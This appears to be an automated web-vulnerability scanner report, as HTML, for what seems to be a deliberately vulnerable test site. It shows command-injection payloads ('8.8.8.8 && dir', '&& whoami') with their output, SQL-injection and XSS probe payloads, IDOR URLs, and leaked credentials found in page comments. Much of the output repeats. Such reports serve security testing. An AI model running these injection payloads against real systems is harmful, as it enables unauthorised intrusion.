@@ -1,0 +1,1775 @@
+<html>
+<head>
+<title>Web Vulnerability Report</title>
+</head>
+<body style='background-color: Orange' opacity: 0.3;>
+<div style='display: inline-block;'><h1><b><span style="color: red;">Web Vulnerability Report </h1></b></span><h2>Tested Domain :www.ffu.com / Test Date     : 2024-05-01</h2><h2>Server Info : Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4 </h2>
+</div><h2>Open Ports</h2>
+<pre>
+Port 80 is open
+Port 443 is open
+Port 3306 is open
+Port 80 is open
+Port 443 is open
+Port 3306 is open
+Port 80 is open
+Port 443 is open
+Port 3306 is open
+</pre>
+<h2>Header security related vulnerabailities</h2>
+<pre>
+- Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4-HTTP methods: OPTIONS,HEAD,GET,POST,TRACE
+- Content-Security-Policy header missing (Potential XSS vulnerability)
+- X-Frame-Options header missing (Clickjacking vulnerability)
+- X-XSS-Protection header missing (Potential XSS vulnerability)
+- Server header found: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4 (May reveal server details)
+- Strict-Transport-Security header missing (HTTP to HTTPS downgrade vulnerability)
+- X-Content-Type-Options header missing (MIME sniffing vulnerability)
+- Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4-HTTP methods: OPTIONS,HEAD,GET,POST,TRACE
+- Content-Security-Policy header missing (Potential XSS vulnerability)
+- X-Frame-Options header missing (Clickjacking vulnerability)
+- X-XSS-Protection header missing (Potential XSS vulnerability)
+- Server header found: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4 (May reveal server details)
+- Strict-Transport-Security header missing (HTTP to HTTPS downgrade vulnerability)
+- X-Content-Type-Options header missing (MIME sniffing vulnerability)
+- Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4-HTTP methods: OPTIONS,HEAD,GET,POST,TRACE
+- Content-Security-Policy header missing (Potential XSS vulnerability)
+- X-Frame-Options header missing (Clickjacking vulnerability)
+- X-XSS-Protection header missing (Potential XSS vulnerability)
+- Server header found: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4 (May reveal server details)
+- Strict-Transport-Security header missing (HTTP to HTTPS downgrade vulnerability)
+- X-Content-Type-Options header missing (MIME sniffing vulnerability)
+</pre>
+<h2>Possible data base name found</h2>
+<pre>
+fatihfurkan                        fatihfurkan</pre>
+<h2>Possible command injection found</h2>
+<pre>
+command injection found with: 8.8.8.8 && dir
+Response: <!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>FFU project test site</title>
+
+    <style>
+
+        /* Add your custom CSS styles here */
+
+        body {
+
+            font-family: Arial, sans-serif;
+
+            background-color: #f2f2f2;
+
+            margin: 0;
+
+            padding: 0;
+
+        }
+
+        header {
+
+            background-color: #333;
+
+            padding: 10px;
+
+            color: #fff;
+
+            display: flex;
+
+            align-items: center;
+
+               justify-content: space-between; /* Align the list to the right */
+
+
+
+        }
+
+        header img {
+
+            width: 50px;
+
+            height: 50px;
+
+            margin-right: 10px;
+
+        }
+
+        header ul {
+
+            list-style: none;
+
+            margin: 0;
+
+            padding: 0;
+
+            display: flex;
+
+        }
+
+        header li {
+
+            margin-left: 20px;
+
+        }
+
+        a{
+
+        color:white;
+
+        }
+
+        h1 {
+
+            font-family: 'Your Custom Font', Arial, sans-serif;
+
+            text-align: center;
+
+            margin: 30px 0;
+
+        }
+
+        p {
+
+            text-align: center;
+
+            margin-bottom: 30px;
+
+        }
+
+        .btn-container {
+
+            display: flex;
+
+            justify-content: center;
+
+        }
+
+        .button {
+
+            background-color: #007BFF;
+
+            color: #fff;
+
+            border: none;
+
+            padding: 10px 20px;
+
+            margin: 10px;
+
+            border-radius: 5px;
+
+            cursor: pointer;
+
+            font-size: 16px;
+
+        }
+
+        .button:hover {
+
+            background-color: #0056b3;
+
+        }
+
+        p {
+
+            text-align: center;
+
+            font-size: 18px;
+
+            line-height: 1.6;
+
+            max-width: 800px;
+
+            margin: 0 auto 30px;
+
+            padding: 10px;
+
+            background-color: #f9f9f9;
+
+            border: 1px solid #ccc;
+
+            border-radius: 5px;
+
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+
+        }
+
+
+
+        /* Add some color and emphasis for specific text */
+
+        p strong {
+
+            color: #007BFF;
+
+        }
+
+
+
+        /* Add some margin to the button container */
+
+        .btn-container {
+
+            display: flex;
+
+            justify-content: center;
+
+            margin-top: 20px;
+
+        }
+
+                header {
+
+            background-color: #333;
+
+            padding: 10px;
+
+            color: #fff;
+
+            display: flex;
+
+            justify-content: space-between; /* Align the list to the right */
+
+            align-items: center;
+
+        }
+
+
+
+        header img {
+
+            width: 100px;
+
+            height: 50px;
+
+            margin-right: 10px;
+
+        }
+
+
+
+        header ul {
+
+            list-style: none;
+
+            margin: 0;
+
+            padding: 0;
+
+            display: flex;
+
+        }
+
+
+
+        header li {
+
+            margin-left: 20px;
+
+        }
+
+           .button-container {
+
+            display: flex;
+
+            flex-direction: column;
+
+            align-items: center;
+
+            margin-top: 20px;
+
+        }
+
+        .button {
+
+          background-color: #007BFF;
+
+            color: #fff;
+
+            border: none;
+
+            padding: 15px 30px;
+
+            margin: 5px;
+
+            border-radius: 5px;
+
+            cursor: pointer;
+
+            font-size: 16px;
+
+            width: 350px; /* Set the desired width for the buttons */
+
+        }
+
+        .button:hover {
+
+            background-color: #0056b3;
+
+        }
+
+        
+
+        form {
+
+            background-color: #fff;
+
+            border-radius: 8px;
+
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+
+            padding: 20px;
+
+            display: flex;
+
+            flex-direction: column;
+
+            align-items: center;
+
+            width: 300px;
+
+        }
+
+        label {
+
+            font-size: 16px;
+
+            margin-bottom: 10px;
+
+        }
+
+        input[type="text"] {
+
+            padding: 10px;
+
+            border: 1px solid #ccc;
+
+            border-radius: 4px;
+
+            width: 100%;
+
+            font-size: 16px;
+
+        }
+
+        button {
+
+            background-color: #007BFF;
+
+            color: #fff;
+
+            border: none;
+
+            padding: 10px 20px;
+
+            margin-top: 20px;
+
+            border-radius: 4px;
+
+            cursor: pointer;
+
+            font-size: 16px;
+
+            transition: background-color 0.3s;
+
+        }
+
+        button:hover {
+
+            background-color: #0056b3;
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <header>
+
+        <img src="ffu.jpg" alt="Logo">
+
+        <a href="index.html"> HOME</a>
+
+
+
+     </header>
+
+
+
+  
+
+<pre>
+Pinging 8.8.8.8 with 32 bytes of data:
+Reply from 8.8.8.8: bytes=32 time=28ms TTL=118
+Reply from 8.8.8.8: bytes=32 time=31ms TTL=118
+Reply from 8.8.8.8: bytes=32 time=29ms TTL=118
+Reply from 8.8.8.8: bytes=32 time=29ms TTL=118
+
+Ping statistics for 8.8.8.8:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 28ms, Maximum = 31ms, Average = 29ms
+ Volume in drive C has no label.
+ Volume Serial Number is BACE-DA84
+
+ Directory of C:\xampp\htdocs\ffu
+
+05/01/2024  03:31 PM    <DIR>          .
+05/01/2024  03:31 PM    <DIR>          ..
+04/19/2024  11:59 PM                76 ''
+04/14/2024  02:05 PM             1,723 (SELECT
+04/21/2024  04:11 PM               116 access.log
+05/01/2024  03:31 PM    <DIR>          admin
+03/23/2024  11:30 PM                74 database.php
+05/01/2024  03:31 PM    <DIR>          dbexport
+03/24/2024  12:04 AM            86,451 FFU.jpg
+03/17/2024  01:05 PM            13,690 ffu.png
+03/24/2024  02:37 PM             1,094 fileupload.php
+03/24/2024  02:40 PM               543 file_inclusion.php
+04/21/2024  04:12 PM                25 grade.tmp
+03/12/2024  06:07 PM             2,145 hacking.sql
+04/23/2024  05:13 PM             2,487 index.html
+03/12/2024  06:07 PM               603 index.php
+03/12/2024  06:07 PM             1,550 login.php
+03/12/2024  06:07 PM               160 logout.php
+03/12/2024  06:07 PM             4,860 main.py
+05/01/2024  03:31 PM    <DIR>          olds
+05/01/2024  03:31 PM    <DIR>          options
+03/24/2024  01:54 PM             5,251 ping_domain.php
+03/12/2024  06:07 PM             2,006 README.md
+04/22/2024  04:36 PM               107 robots.txt
+03/24/2024  12:14 AM             5,028 search.php
+04/22/2024  10:36 PM                92 security.txt
+04/21/2024  01:14 PM             1,023 showfile.php
+04/22/2024  10:42 PM               259 sitemap.xml
+03/24/2024  12:12 AM             6,119 sqli.php
+04/10/2024  06:21 PM             6,295 sqli_login1.php
+03/24/2024  12:29 AM             2,929 test.php
+04/23/2024  10:24 PM             1,454 user_info.php
+04/14/2024  05:46 PM             6,476 user_login.php
+              27 File(s)        152,636 bytes
+               6 Dir(s)  30,083,010,560 bytes free
+</pre> <div class="button-container">
+
+<form method="post" action="">
+
+    Enter the IP or Domain to ping:
+
+    <input type="text" name="input">
+
+    <input type="submit" name="submit" value="Submit">
+
+</form>
+
+
+
+</body>
+
+</html>
+
+
+command injection found with: 8.8.8.8 && whoami
+Response: <!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>FFU project test site</title>
+
+    <style>
+
+        /* Add your custom CSS styles here */
+
+        body {
+
+            font-family: Arial, sans-serif;
+
+            background-color: #f2f2f2;
+
+            margin: 0;
+
+            padding: 0;
+
+        }
+
+        header {
+
+            background-color: #333;
+
+            padding: 10px;
+
+            color: #fff;
+
+            display: flex;
+
+            align-items: center;
+
+               justify-content: space-between; /* Align the list to the right */
+
+
+
+        }
+
+        header img {
+
+            width: 50px;
+
+            height: 50px;
+
+            margin-right: 10px;
+
+        }
+
+        header ul {
+
+            list-style: none;
+
+            margin: 0;
+
+            padding: 0;
+
+            display: flex;
+
+        }
+
+        header li {
+
+            margin-left: 20px;
+
+        }
+
+        a{
+
+        color:white;
+
+        }
+
+        h1 {
+
+            font-family: 'Your Custom Font', Arial, sans-serif;
+
+            text-align: center;
+
+            margin: 30px 0;
+
+        }
+
+        p {
+
+            text-align: center;
+
+            margin-bottom: 30px;
+
+        }
+
+        .btn-container {
+
+            display: flex;
+
+            justify-content: center;
+
+        }
+
+        .button {
+
+            background-color: #007BFF;
+
+            color: #fff;
+
+            border: none;
+
+            padding: 10px 20px;
+
+            margin: 10px;
+
+            border-radius: 5px;
+
+            cursor: pointer;
+
+            font-size: 16px;
+
+        }
+
+        .button:hover {
+
+            background-color: #0056b3;
+
+        }
+
+        p {
+
+            text-align: center;
+
+            font-size: 18px;
+
+            line-height: 1.6;
+
+            max-width: 800px;
+
+            margin: 0 auto 30px;
+
+            padding: 10px;
+
+            background-color: #f9f9f9;
+
+            border: 1px solid #ccc;
+
+            border-radius: 5px;
+
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+
+        }
+
+
+
+        /* Add some color and emphasis for specific text */
+
+        p strong {
+
+            color: #007BFF;
+
+        }
+
+
+
+        /* Add some margin to the button container */
+
+        .btn-container {
+
+            display: flex;
+
+            justify-content: center;
+
+            margin-top: 20px;
+
+        }
+
+                header {
+
+            background-color: #333;
+
+            padding: 10px;
+
+            color: #fff;
+
+            display: flex;
+
+            justify-content: space-between; /* Align the list to the right */
+
+            align-items: center;
+
+        }
+
+
+
+        header img {
+
+            width: 100px;
+
+            height: 50px;
+
+            margin-right: 10px;
+
+        }
+
+
+
+        header ul {
+
+            list-style: none;
+
+            margin: 0;
+
+            padding: 0;
+
+            display: flex;
+
+        }
+
+
+
+        header li {
+
+            margin-left: 20px;
+
+        }
+
+           .button-container {
+
+            display: flex;
+
+            flex-direction: column;
+
+            align-items: center;
+
+            margin-top: 20px;
+
+        }
+
+        .button {
+
+          background-color: #007BFF;
+
+            color: #fff;
+
+            border: none;
+
+            padding: 15px 30px;
+
+            margin: 5px;
+
+            border-radius: 5px;
+
+            cursor: pointer;
+
+            font-size: 16px;
+
+            width: 350px; /* Set the desired width for the buttons */
+
+        }
+
+        .button:hover {
+
+            background-color: #0056b3;
+
+        }
+
+        
+
+        form {
+
+            background-color: #fff;
+
+            border-radius: 8px;
+
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+
+            padding: 20px;
+
+            display: flex;
+
+            flex-direction: column;
+
+            align-items: center;
+
+            width: 300px;
+
+        }
+
+        label {
+
+            font-size: 16px;
+
+            margin-bottom: 10px;
+
+        }
+
+        input[type="text"] {
+
+            padding: 10px;
+
+            border: 1px solid #ccc;
+
+            border-radius: 4px;
+
+            width: 100%;
+
+            font-size: 16px;
+
+        }
+
+        button {
+
+            background-color: #007BFF;
+
+            color: #fff;
+
+            border: none;
+
+            padding: 10px 20px;
+
+            margin-top: 20px;
+
+            border-radius: 4px;
+
+            cursor: pointer;
+
+            font-size: 16px;
+
+            transition: background-color 0.3s;
+
+        }
+
+        button:hover {
+
+            background-color: #0056b3;
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <header>
+
+        <img src="ffu.jpg" alt="Logo">
+
+        <a href="index.html"> HOME</a>
+
+
+
+     </header>
+
+
+
+  
+
+<pre>
+Pinging 8.8.8.8 with 32 bytes of data:
+Reply from 8.8.8.8: bytes=32 time=31ms TTL=118
+Reply from 8.8.8.8: bytes=32 time=32ms TTL=118
+Reply from 8.8.8.8: bytes=32 time=28ms TTL=118
+Reply from 8.8.8.8: bytes=32 time=29ms TTL=118
+
+Ping statistics for 8.8.8.8:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 28ms, Maximum = 32ms, Average = 30ms
+desktop-4bm1itb\user
+</pre> <div class="button-container">
+
+<form method="post" action="">
+
+    Enter the IP or Domain to ping:
+
+    <input type="text" name="input">
+
+    <input type="submit" name="submit" value="Submit">
+
+</form>
+
+
+
+</body>
+
+</html>
+
+
+command injection found with: 8.8.8.8 && dir
+Response: <!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>FFU project test site</title>
+
+    <style>
+
+        /* Add your custom CSS styles here */
+
+        body {
+
+            font-family: Arial, sans-serif;
+
+            background-color: #f2f2f2;
+
+            margin: 0;
+
+            padding: 0;
+
+        }
+
+        header {
+
+            background-color: #333;
+
+            padding: 10px;
+
+            color: #fff;
+
+            display: flex;
+
+            align-items: center;
+
+               justify-content: space-between; /* Align the list to the right */
+
+
+
+        }
+
+        header img {
+
+            width: 50px;
+
+            height: 50px;
+
+            margin-right: 10px;
+
+        }
+
+        header ul {
+
+            list-style: none;
+
+            margin: 0;
+
+            padding: 0;
+
+            display: flex;
+
+        }
+
+        header li {
+
+            margin-left: 20px;
+
+        }
+
+        a{
+
+        color:white;
+
+        }
+
+        h1 {
+
+            font-family: 'Your Custom Font', Arial, sans-serif;
+
+            text-align: center;
+
+            margin: 30px 0;
+
+        }
+
+        p {
+
+            text-align: center;
+
+            margin-bottom: 30px;
+
+        }
+
+        .btn-container {
+
+            display: flex;
+
+            justify-content: center;
+
+        }
+
+        .button {
+
+            background-color: #007BFF;
+
+            color: #fff;
+
+            border: none;
+
+            padding: 10px 20px;
+
+            margin: 10px;
+
+            border-radius: 5px;
+
+            cursor: pointer;
+
+            font-size: 16px;
+
+        }
+
+        .button:hover {
+
+            background-color: #0056b3;
+
+        }
+
+        p {
+
+            text-align: center;
+
+            font-size: 18px;
+
+            line-height: 1.6;
+
+            max-width: 800px;
+
+            margin: 0 auto 30px;
+
+            padding: 10px;
+
+            background-color: #f9f9f9;
+
+            border: 1px solid #ccc;
+
+            border-radius: 5px;
+
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+
+        }
+
+
+
+        /* Add some color and emphasis for specific text */
+
+        p strong {
+
+            color: #007BFF;
+
+        }
+
+
+
+        /* Add some margin to the button container */
+
+        .btn-container {
+
+            display: flex;
+
+            justify-content: center;
+
+            margin-top: 20px;
+
+        }
+
+                header {
+
+            background-color: #333;
+
+            padding: 10px;
+
+            color: #fff;
+
+            display: flex;
+
+            justify-content: space-between; /* Align the list to the right */
+
+            align-items: center;
+
+        }
+
+
+
+        header img {
+
+            width: 100px;
+
+            height: 50px;
+
+            margin-right: 10px;
+
+        }
+
+
+
+        header ul {
+
+            list-style: none;
+
+            margin: 0;
+
+            padding: 0;
+
+            display: flex;
+
+        }
+
+
+
+        header li {
+
+            margin-left: 20px;
+
+        }
+
+           .button-container {
+
+            display: flex;
+
+            flex-direction: column;
+
+            align-items: center;
+
+            margin-top: 20px;
+
+        }
+
+        .button {
+
+          background-color: #007BFF;
+
+            color: #fff;
+
+            border: none;
+
+            padding: 15px 30px;
+
+            margin: 5px;
+
+            border-radius: 5px;
+
+            cursor: pointer;
+
+            font-size: 16px;
+
+            width: 350px; /* Set the desired width for the buttons */
+
+        }
+
+        .button:hover {
+
+            background-color: #0056b3;
+
+        }
+
+        
+
+        form {
+
+            background-color: #fff;
+
+            border-radius: 8px;
+
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+
+            padding: 20px;
+
+            display: flex;
+
+            flex-direction: column;
+
+            align-items: center;
+
+            width: 300px;
+
+        }
+
+        label {
+
+            font-size: 16px;
+
+            margin-bottom: 10px;
+
+        }
+
+        input[type="text"] {
+
+            padding: 10px;
+
+            border: 1px solid #ccc;
+
+            border-radius: 4px;
+
+            width: 100%;
+
+            font-size: 16px;
+
+        }
+
+        button {
+
+            background-color: #007BFF;
+
+            color: #fff;
+
+            border: none;
+
+            padding: 10px 20px;
+
+            margin-top: 20px;
+
+            border-radius: 4px;
+
+            cursor: pointer;
+
+            font-size: 16px;
+
+            transition: background-color 0.3s;
+
+        }
+
+        button:hover {
+
+            background-color: #0056b3;
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <header>
+
+        <img src="ffu.jpg" alt="Logo">
+
+        <a href="index.html"> HOME</a>
+
+
+
+     </header>
+
+
+
+  
+
+<pre>
+Pinging 8.8.8.8 with 32 bytes of data:
+Reply from 8.8.8.8: bytes=32 time=35ms TTL=118
+Reply from 8.8.8.8: bytes=32 time=28ms TTL=118
+Reply from 8.8.8.8: bytes=32 time=33ms TTL=118
+Reply from 8.8.8.8: bytes=32 time=29ms TTL=118
+
+Ping statistics for 8.8.8.8:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 28ms, Maximum = 35ms, Average = 31ms
+ Volume in drive C has no label.
+ Volume Serial Number is BACE-DA84
+
+ Directory of C:\xampp\htdocs\ffu
+
+05/01/2024  03:31 PM    <DIR>          .
+05/01/2024  03:31 PM    <DIR>          ..
+04/19/2024  11:59 PM                76 ''
+04/14/2024  02:05 PM             1,723 (SELECT
+04/21/2024  04:11 PM               116 access.log
+05/01/2024  03:31 PM    <DIR>          admin
+03/23/2024  11:30 PM                74 database.php
+05/01/2024  03:31 PM    <DIR>          dbexport
+03/24/2024  12:04 AM            86,451 FFU.jpg
+03/17/2024  01:05 PM            13,690 ffu.png
+03/24/2024  02:37 PM             1,094 fileupload.php
+03/24/2024  02:40 PM               543 file_inclusion.php
+04/21/2024  04:12 PM                25 grade.tmp
+03/12/2024  06:07 PM             2,145 hacking.sql
+04/23/2024  05:13 PM             2,487 index.html
+03/12/2024  06:07 PM               603 index.php
+03/12/2024  06:07 PM             1,550 login.php
+03/12/2024  06:07 PM               160 logout.php
+03/12/2024  06:07 PM             4,860 main.py
+05/01/2024  03:31 PM    <DIR>          olds
+05/01/2024  03:31 PM    <DIR>          options
+03/24/2024  01:54 PM             5,251 ping_domain.php
+03/12/2024  06:07 PM             2,006 README.md
+04/22/2024  04:36 PM               107 robots.txt
+03/24/2024  12:14 AM             5,028 search.php
+04/22/2024  10:36 PM                92 security.txt
+04/21/2024  01:14 PM             1,023 showfile.php
+04/22/2024  10:42 PM               259 sitemap.xml
+03/24/2024  12:12 AM             6,119 sqli.php
+04/10/2024  06:21 PM             6,295 sqli_login1.php
+03/24/2024  12:29 AM             2,929 test.php
+04/23/2024  10:24 PM             1,454 user_info.php
+04/14/2024  05:46 PM             6,476 user_login.php
+              27 File(s)        152,636 bytes
+               6 Dir(s)  30,102,736,896 bytes free
+</pre> <div class="button-container">
+
+<form method="post" action="">
+
+    Enter the IP or Domain to ping:
+
+    <input type="text" name="input">
+
+    <input type="submit" name="submit" value="Submit">
+
+</form>
+
+
+
+</body>
+
+</html>
+
+
+command injection found with: 8.8.8.8 && whoami
+Response: <!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>FFU project test site</title>
+
+    <style>
+
+        /* Add your custom CSS styles here */
+
+        body {
+
+            font-family: Arial, sans-serif;
+
+            background-color: #f2f2f2;
+
+            margin: 0;
+
+            padding: 0;
+
+        }
+
+        header {
+
+            background-color: #333;
+
+            padding: 10px;
+
+            color: #fff;
+
+            display: flex;
+
+            align-items: center;
+
+               justify-content: space-between; /* Align the list to the right */
+
+
+
+        }
+
+        header img {
+
+            width: 50px;
+
+            height: 50px;
+
+            margin-right: 10px;
+
+        }
+
+        header ul {
+
+            list-style: none;
+
+            margin: 0;
+
+            padding: 0;
+
+            display: flex;
+
+        }
+
+        header li {
+
+            margin-left: 20px;
+
+        }
+
+        a{
+
+        color:white;
+
+        }
+
+        h1 {
+
+            font-family: 'Your Custom Font', Arial, sans-serif;
+
+            text-align: center;
+
+            margin: 30px 0;
+
+        }
+
+        p {
+
+            text-align: center;
+
+            margin-bottom: 30px;
+
+        }
+
+        .btn-container {
+
+            display: flex;
+
+            justify-content: center;
+
+        }
+
+        .button {
+
+            background-color: #007BFF;
+
+            color: #fff;
+
+            border: none;
+
+            padding: 10px 20px;
+
+            margin: 10px;
+
+            border-radius: 5px;
+
+            cursor: pointer;
+
+            font-size: 16px;
+
+        }
+
+        .button:hover {
+
+            background-color: #0056b3;
+
+        }
+
+        p {
+
+            text-align: center;
+
+            font-size: 18px;
+
+            line-height: 1.6;
+
+            max-width: 800px;
+
+            margin: 0 auto 30px;
+
+            padding: 10px;
+
+            background-color: #f9f9f9;
+
+            border: 1px solid #ccc;
+
+            border-radius: 5px;
+
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+
+        }
+
+
+
+        /* Add some color and emphasis for specific text */
+
+        p strong {
+
+            color: #007BFF;
+
+        }
+
+
+
+        /* Add some margin to the button container */
+
+        .btn-container {
+
+            display: flex;
+
+            justify-content: center;
+
+            margin-top: 20px;
+
+        }
+
+                header {
+
+            background-color: #333;
+
+            padding: 10px;
+
+            color: #fff;
+
+            display: flex;
+
+            justify-content: space-between; /* Align the list to the right */
+
+            align-items: center;
+
+        }
+
+
+
+        header img {
+
+            width: 100px;
+
+            height: 50px;
+
+            margin-right: 10px;
+
+        }
+
+
+
+        header ul {
+
+            list-style: none;
+
+            margin: 0;
+
+            padding: 0;
+
+            display: flex;
+
+        }
+
+
+
+        header li {
+
+            margin-left: 20px;
+
+        }
+
+           .button-container {
+
+            display: flex;
+
+            flex-direction: column;
+
+            align-items: center;
+
+            margin-top: 20px;
+
+        }
+
+        .button {
+
+          background-color: #007BFF;
+
+            color: #fff;
+
+            border: none;
+
+            padding: 15px 30px;
+
+            margin: 5px;
+
+            border-radius: 5px;
+
+            cursor: pointer;
+
+            font-size: 16px;
+
+            width: 350px; /* Set the desired width for the buttons */
+
+        }
+
+        .button:hover {
+
+            background-color: #0056b3;
+
+        }
+
+        
+
+        form {
+
+            background-color: #fff;
+
+            border-radius: 8px;
+
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+
+            padding: 20px;
+
+            display: flex;
+
+            flex-direction: column;
+
+            align-items: center;
+
+            width: 300px;
+
+        }
+
+        label {
+
+            font-size: 16px;
+
+            margin-bottom: 10px;
+
+        }
+
+        input[type="text"] {
+
+            padding: 10px;
+
+            border: 1px solid #ccc;
+
+            border-radius: 4px;
+
+            width: 100%;
+
+            font-size: 16px;
+
+        }
+
+        button {
+
+            background-color: #007BFF;
+
+            color: #fff;
+
+            border: none;
+
+            padding: 10px 20px;
+
+            margin-top: 20px;
+
+            border-radius: 4px;
+
+            cursor: pointer;
+
+            font-size: 16px;
+
+            transition: background-color 0.3s;
+
+        }
+
+        button:hover {
+
+            background-color: #0056b3;
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <header>
+
+        <img src="ffu.jpg" alt="Logo">
+
+        <a href="index.html"> HOME</a>
+
+
+
+     </header>
+
+
+
+  
+
+<pre>
+Pinging 8.8.8.8 with 32 bytes of data:
+Reply from 8.8.8.8: bytes=32 time=28ms TTL=118
+Reply from 8.8.8.8: bytes=32 time=29ms TTL=118
+Reply from 8.8.8.8: bytes=32 time=29ms TTL=118
+Reply from 8.8.8.8: bytes=32 time=29ms TTL=118
+
+Ping statistics for 8.8.8.8:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 28ms, Maximum = 29ms, Average = 28ms
+desktop-4bm1itb\user
+</pre> <div class="button-container">
+
+<form method="post" action="">
+
+    Enter the IP or Domain to ping:
+
+    <input type="text" name="input">
+
+    <input type="submit" name="submit" value="Submit">
+
+</form>
+
+
+
+</body>
+
+</html>
+
+
+</pre>
+<h2>Possible sensitive data</h2>
+<pre>
+Possible backup file found at http://www.ffu.com/db01.zip data: .zip
+Potential information leakage detected! Keyword : password:
+ found. At http://www.ffu.com/user_login.php : b'        <label for="password">Password:</label>':
+Potential information leakage detected! Keyword : password=
+ found. At http://www.ffu.com/user_login.php : b'        &lt;!-- password=12345 -->':
+Potential information leakage detected! Keyword : api_key
+ found. At http://www.ffu.com/user_login.php : b'        &lt;!-- API_KEY=AROAQAZWSX -->':
+Potential information leakage detected! Keyword : user=
+ found. At http://www.ffu.com/user_login.php : b'\t\t&lt;!-- connection:user=sa;password=yeditepe;db=grades TCKN:821111111-->':
+</pre>
+<h2>Possible sql injection vulnerabailities</h2>
+<pre>
+url: http://www.ffu.com/ping_domain.php
+form_details: {'action': '', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'input', 'value': ';'}, {'type': 'submit', 'name': 'submit'}]}
+payload: < ; >
+----------------------------
+url: http://www.ffu.com/user_login.php
+form_details: {'action': '', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'username', 'value': ';'}, {'type': 'password', 'name': 'password'}, {'type': 'checkbox', 'name': 'remember'}]}
+payload: < ; >
+----------------------------
+url: http://www.ffu.com/search.php
+form_details: {'action': '', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'username', 'value': '%20union%20select%201,2,user()--'}]}
+payload: < %20union%20select%201,2,user()-- >
+----------------------------
+url: http://www.ffu.com/ping_domain.php
+form_details: {'action': '', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'input', 'value': ';'}, {'type': 'submit', 'name': 'submit'}]}
+payload: < ; >
+----------------------------
+url: http://www.ffu.com/user_login.php
+form_details: {'action': '', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'username', 'value': ';'}, {'type': 'password', 'name': 'password'}, {'type': 'checkbox', 'name': 'remember'}]}
+payload: < ; >
+----------------------------
+</pre>
+<h2>Possible XSS related vulnerabailities</h2>
+<pre>
+URL: http://www.ffu.com/search.php
+Form Details:{'action': '', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'username', 'value': "&lt;script>alert('FFU XSS')</script>"}]}
+Loaded Payload: &lt;script>alert('FFU XSS')</script>
+----------------------------
+</pre>
+<h2>Possible IDOR vulnerabailities</h2>
+<pre>
+Possbile IDOR at URL : http://www.ffu.com/user_info.php?user_id=1 
+Possbile IDOR at URL : http://www.ffu.com/user_info.php?user_id=2 
+</pre>
+<h2>subdomains related to main domain </h2>
+<pre>
+ffu.com
+xn--ffu.com
+www.ffu.com
+ftp.ffu.com
+ffu.com
+xn--ffu.com
+ftp.ffu.com
+www.ffu.com
+ffu.com
+xn--ffu.com
+ftp.ffu.com
+www.ffu.com
+</pre>
+<h2>Found urls</h2>
+<pre>
+http://www.ffu.com/search.php
+http://www.ffu.com/db01.zip
+http://www.ffu.com/user_info.php?user_id=2
+http://www.ffu.com/ping_domain.php
+http://www.ffu.com/admin
+http://www.ffu.com/user_login.php
+</pre>
+</body>
+</html>
